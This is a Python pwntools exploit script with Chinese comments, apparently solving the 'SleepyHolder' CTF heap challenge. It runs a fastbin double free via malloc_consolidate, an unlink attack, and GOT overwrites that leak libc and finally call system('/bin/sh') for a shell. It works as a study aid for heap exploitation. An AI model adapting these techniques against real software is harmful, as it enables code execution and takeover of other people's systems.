# -*- coding:utf-8 -*-
from pwn import *

context.log_level = 'debug'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
p = process('./SleepyHolder')
#p = remote('127.0.0.1', 4000)

elf = ELF('./SleepyHolder')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.19.so')

def add(index, content):
	p.recvuntil('3. Renew secret\n')
	p.sendline('1')
	p.recvuntil('\n')
	p.sendline(str(index))
	p.recvuntil('secret: \n')
	p.send(content)
	
def delete(index):
	p.recvuntil('3. Renew secret\n')
	p.sendline('2')
	p.recvuntil('2. Big secret\n')
	p.send(str(index))

def update(index, content):
	p.recvuntil('3. Renew secret\n')
	p.sendline('3')
	p.recvuntil('2. Big secret\n')
	p.sendline(str(index))
	p.recvuntil('secret: \n')
	p.send(content)

#分配chunk1 chunk2
add(1, 'a'*0x10)
add(2, 'b'*0x10)
#释放chunk1
delete(1)
#分配chunk3，因为是large chunk
#会先利用malloc_consolidate处理fastbin中的chunk，将能合并的chunk合并后放入unsortedbin
#不能合并的就直接放到unsortedbin(这样的目的是减少堆中的碎片)，然后会进入大循环处理
#因为chunk1在fastbin中，所以chunk1就被移动到了unsortedbin，同时chunk2的inuse位变为0了
add(3, 'c'*0x10)
#这时再释放chunk1就不会触发double free
#且这时chunk1不仅存在于unsortedbin，还在fastbin中
delete(1)

f_ptr = 0x6020d0 #堆指针
#准备unlink，在chunk1中伪造chunk
payload = p64(0) + p64(0x21)
payload += p64(f_ptr - 0x18) + p64(f_ptr - 0x10)
payload += p64(0x20)#因为内存复用，这里设置chunk2的prev_size
add(1, payload)
#此时chunk2的inuse位是0，所以触发unlink
delete(2)

free_got = elf.got['free']
atoi_got = elf.got['atoi']
puts_got = elf.got['puts']
puts = elf.symbols['puts']
system_off = libc.symbols['system']
atoi_off = libc.symbols['atoi']

#unlink后 堆指针被修改，向现在指针所指内存写入数据
#将chunk2指针覆盖为atoi_got
#将chunk3指针覆盖为puts_got
#将chunk1指针覆盖为free_got
payload = p64(0) + p64(atoi_got)
payload += p64(puts_got) + p64(free_got)
update(1, payload)
#此时已经覆盖完成，再次向chunk1写入，相当于向free_got写入
#这里将free的got表写为puts
update(1, p64(puts))

#删除chunk2，但是free的got表已经被写为puts，所以这里实际调用puts
#因为chunk2指针被覆盖为atoi_got，所以输出的是atoi的实际地址
#由此可计算出libc_base
delete(2)
libc_base = u64(p.recv(6) + '\x00\x00') - atoi_off#这里只能取6个字节，通过调试发现的，不清楚原因
print "libc_base : %#x" % libc_base 
system = libc_base + system_off

#将free的got表写为system
update(1, p64(system))
#向chunk2中写入binsh 释放chunk2时 chunk2的内容会作为参数
add(2, '/bin/sh\x00')
delete(2)

p.interactive()



